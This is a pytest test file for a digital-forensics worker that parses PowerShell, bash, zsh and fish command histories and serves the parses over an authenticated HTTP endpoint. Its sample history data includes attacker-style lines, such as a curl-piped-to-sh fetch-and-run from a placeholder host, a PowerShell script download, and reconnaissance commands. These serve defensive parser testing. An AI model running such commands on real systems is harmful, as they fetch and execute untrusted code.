"""The forensics worker: what a parser says, a parse in its own process, the HTTP front.

Run in the worker's image: ``python -m pytest tests`` from /opt/nik-forensics. Every file is made
here: harmless text, never evidence.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import signal
import subprocess
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
os.environ.setdefault("FORENSICS_TOKEN", "a token for the tests, long enough")

from nik_forensics import parsers  # noqa: E402
from nik_forensics.context import MAX_KEY, MAX_VALUE, Context  # noqa: E402
from nik_forensics.parsers import history  # noqa: E402

TOKEN = os.environ["FORENSICS_TOKEN"]


def events(data: bytes) -> list[dict]:
    return [json.loads(line) for line in data.splitlines() if line]


def said(parse, *args, params=None) -> list[dict]:
    out = io.BytesIO()
    parse(*args, Context(out, params or {}))
    return events(out.getvalue())


# --------------------------------------------------------------------------- #
# What a parser says                                                          #
# --------------------------------------------------------------------------- #
def test_values_are_cut_and_the_record_says_so():
    out = io.BytesIO()
    ctx = Context(out)
    ctx.record(key="k1", type="event", ts=1000, data={"short": "x", "long": "y" * (MAX_VALUE + 5), "n": [1, b"\x01"]})
    ctx.record(key="k" * 1000, type="event", data={"a": 1})
    ctx.skip("unreadable", offset=10, length=4)
    ctx.note("blank", count=2)
    ctx.end(in_file=3)
    ctx.end()  # once
    first, second, skip, note, end = events(out.getvalue())
    assert first["trunc"] is True and len(first["data"]["long"]) == MAX_VALUE and first["data"]["n"] == [1, "01"]
    assert second["trunc"] is False and len(second["key"]) == MAX_KEY and second["seq"] == 1
    assert (skip["t"], skip["lost"], skip["offset"]) == ("skip", 1, 10) and note["count"] == 2
    assert end == {"t": "end", "in_file": 3, "read": 2, "first_ts": 1000, "last_ts": 1000}


def test_a_record_too_large_to_send_is_a_skip():
    out = io.BytesIO()
    ctx = Context(out)
    ctx.record(key="big", type="event", data={str(n): "z" * MAX_VALUE for n in range(400)}, loc={"offset": 7})
    (skip,) = events(out.getvalue())
    assert skip["reason"] == "record too large to keep" and skip["offset"] == 7 and ctx.read == 0


# --------------------------------------------------------------------------- #
# Command histories                                                           #
# --------------------------------------------------------------------------- #
def write(tmp_path, name: str, data: bytes) -> str:
    path = tmp_path / name
    path.write_bytes(data)
    return str(path)


def test_a_powershell_history_keeps_every_command_in_order(tmp_path):
    data = b"\xef\xbb\xbfwhoami\r\n\r\nGet-Process |`\r\n  Select Name\r\niwr http://example.test/a -OutFile a.ps1\r\n"
    path = write(tmp_path, "ConsoleHost_history.txt", data)
    assert history.sniff(path, "C:\\Users\\a\\ConsoleHost_history.txt", data[:100]) == "powershell"
    found = said(lambda p, c: history.parse(p, c, "powershell"), path, params={"host": "WKS", "username": "a"})
    source, *rest = found
    assert (source["parser"], source["kind"], source["source"], source["host"]) == (
        "history",
        "commands",
        "powershell",
        "WKS",
    )
    records = [event for event in rest if event["t"] == "r"]
    assert [record["data"]["command"] for record in records] == [
        "whoami",
        "Get-Process |`\n  Select Name",
        "iwr http://example.test/a -OutFile a.ps1",
    ]
    assert [record["data"]["program"] for record in records] == ["whoami", "Get-Process", "iwr"]
    assert all(record["ts"] is None for record in records)
    # Where each is in the file: the viewer opens the original there.
    assert data[records[2]["loc"]["offset"] :].startswith(b"iwr ") and records[1]["loc"]["line"] == 3
    notes = {event["reason"]: event["count"] for event in rest if event["t"] == "note"}
    assert notes == {"blank line": 1, "no time": 3}
    assert rest[-1] == {"t": "end", "in_file": None, "read": 3, "first_ts": None, "last_ts": None}
    # Read again, the same keys: flags and notes on records hold on to them.
    again = said(lambda p, c: history.parse(p, c, "powershell"), path, params={"host": "WKS", "username": "a"})
    assert [e["key"] for e in again if e["t"] == "r"] == [record["key"] for record in records]


def test_bash_and_zsh_times_are_read_when_the_shell_wrote_them(tmp_path):
    bash = write(tmp_path, ".bash_history", b"ls\n#1700000000\ncurl -s http://example.test | sh\n\xff\xfe bad\n")
    found = said(lambda p, c: history.parse(p, c, "bash"), bash)
    records = [event for event in found if event["t"] == "r"]
    assert [(r["data"]["command"], r["ts"]) for r in records[:2]] == [
        ("ls", None),
        ("curl -s http://example.test | sh", 1700000000000),
    ]
    assert any(e["t"] == "note" and "not UTF-8" in e["reason"] for e in found) and len(records) == 3
    zsh = write(tmp_path, ".zsh_history", b": 1700000100:0;echo one\\\ntwo\n: 1700000200:3;sudo -i\n")
    found = [event for event in said(lambda p, c: history.parse(p, c, "zsh"), zsh) if event["t"] == "r"]
    assert [(r["data"]["command"], r["ts"]) for r in found] == [
        ("echo one\ntwo", 1700000100000),
        ("sudo -i", 1700000200000),
    ]


def test_fish_history_blocks_keep_their_time_escaped_newlines_and_paths(tmp_path):
    data = (
        b"- cmd: ls -la\n  when: 1700000000\n"
        b"- cmd: echo one\\ntwo \\\\n three\n  when: 1700000100\n  paths:\n    - /etc/hosts\n"
        b"- cmd: no time here\n"
        b"stray line\n"
    )
    path = write(tmp_path, "fish_history", data)
    assert history.sniff(path, "/home/a/.local/share/fish/fish_history", data[:100]) == "fish"
    found = said(lambda p, c: history.parse(p, c, "fish"), path, params={"host": "H"})
    records = [event for event in found if event["t"] == "r"]
    assert [(r["data"]["command"], r["ts"]) for r in records] == [
        ("ls -la", 1700000000000),
        ("echo one\ntwo \\n three", 1700000100000),
        ("no time here", None),
    ]
    assert records[1]["data"]["paths"] == ["/etc/hosts"] and "paths" not in records[0]["data"]
    assert [r["loc"]["line"] for r in records] == [1, 3, 7]
    assert data[records[1]["loc"]["offset"] :].startswith(b"- cmd: echo one")
    assert records[1]["loc"]["length"] == len(
        b"- cmd: echo one\\ntwo \\\\n three\n  when: 1700000100\n  paths:\n    - /etc/hosts\n"
    )
    assert records[0]["key"].startswith("cmd:fish:H::1:")
    notes = {event["reason"]: event["count"] for event in found if event["t"] == "note"}
    assert notes == {"line that belongs to no command": 1}
    again = said(lambda p, c: history.parse(p, c, "fish"), path, params={"host": "H"})
    assert [e["key"] for e in again if e["t"] == "r"] == [r["key"] for r in records]


def test_a_file_no_parser_reads_is_said_not_guessed(tmp_path):
    path = write(tmp_path, "notes.txt", b"just a file")
    with pytest.raises(parsers.UnknownParser):
        parsers.recognise(path, "notes.txt")
    module, source = parsers.recognise(write(tmp_path, ".bash_history", b"ls\n"), "/home/a/.bash_history")
    assert (module.NAME, source) == ("history", "bash")


# --------------------------------------------------------------------------- #
# A parse in its own process, behind the HTTP front                           #
# --------------------------------------------------------------------------- #
@pytest.fixture()
def worker(tmp_path, monkeypatch):
    monkeypatch.setenv("FORENSICS_WORK_DIR", str(tmp_path / "work"))
    sys.modules.pop("server", None)
    import server

    server.GIVEN.clear()
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield server, f"http://127.0.0.1:{httpd.server_port}"
    httpd.shutdown()
    httpd.server_close()


def call(base: str, method: str, path: str, body=None, token: str = TOKEN, raw: bytes | None = None):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    request = urllib.request.Request(base + path, data=data, method=method, headers={"X-Forensics-Token": token})
    try:
        with urllib.request.urlopen(request, timeout=60) as answer:  # noqa: S310 - the test's own server
            return answer.status, answer.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()


def test_a_file_is_given_then_parsed_and_the_events_come_as_lines(worker):
    _server, base = worker
    data = b"whoami\nnet user\n"
    name = hashlib.sha256(data).hexdigest() + ".bin"
    asked = {"name": name, "fileName": "ConsoleHost_history.txt", "params": {"host": "WKS"}}
    status, body = call(base, "POST", "/parse", asked)
    assert status == 409 and json.loads(body)["missing"] == [name], "the backend is told what to send"
    assert call(base, "PUT", f"/files/{name}", raw=data)[0] == 200
    assert call(base, "PUT", f"/files/{'0' * 64}.bin", raw=data)[0] == 422, "a file that is not what its name says"
    assert call(base, "POST", "/parse", asked, token="wrong")[0] == 401
    status, body = call(base, "POST", "/recognise", asked)
    assert status == 200 and json.loads(body) == {
        "parser": "history",
        "version": "1",
        "kind": "commands",
        "source": "powershell",
    }
    status, body = call(base, "POST", "/parse", asked)
    found = events(body)
    assert status == 200 and [event["t"] for event in found] == ["source", "r", "r", "note", "end"]
    assert found[1]["host"] == "WKS" and found[-1]["read"] == 2

    # A file nothing reads: said in the stream, and no "end".
    other = b"\x00\x01 nothing Nik reads"
    other_name = hashlib.sha256(other).hexdigest() + ".bin"
    call(base, "PUT", f"/files/{other_name}", raw=other)
    status, body = call(base, "POST", "/parse", {"name": other_name, "fileName": "x.dat"})
    assert status == 200 and [(e["t"], e["reason"]) for e in events(body)] == [("skip", "no parser reads this file")]
    assert call(base, "POST", "/recognise", {"name": other_name, "fileName": "x.dat"})[0] == 422


def test_a_parser_that_dies_is_said_in_the_last_line(worker, tmp_path):
    server, _base = worker
    assert server.how_it_stopped(0, False) is None and server.how_it_stopped(1, False) is None
    killed = server.how_it_stopped(-signal.SIGSEGV, False)
    assert killed["t"] == "skip" and killed["reason"] == "the parser stopped" and "SIGSEGV" in killed["detail"]
    assert "more than" in server.how_it_stopped(-signal.SIGKILL, True)["detail"]
    # The job itself, as the server starts it: what the parser said, then how it left.
    path = tmp_path / "h"
    path.write_bytes(b"ls\n")
    done = subprocess.run(
        server.job_command(str(path), {"parser": "history", "source": "bash"}), capture_output=True, check=False
    )
    assert done.returncode == 0 and events(done.stdout)[-1]["t"] == "end"
    gone = subprocess.run(
        server.job_command(str(tmp_path / "missing"), {"parser": "history", "source": "bash"}),
        capture_output=True,
        check=False,
    )
    assert gone.returncode == 1 and events(gone.stdout)[-1]["reason"] == "the parser stopped"
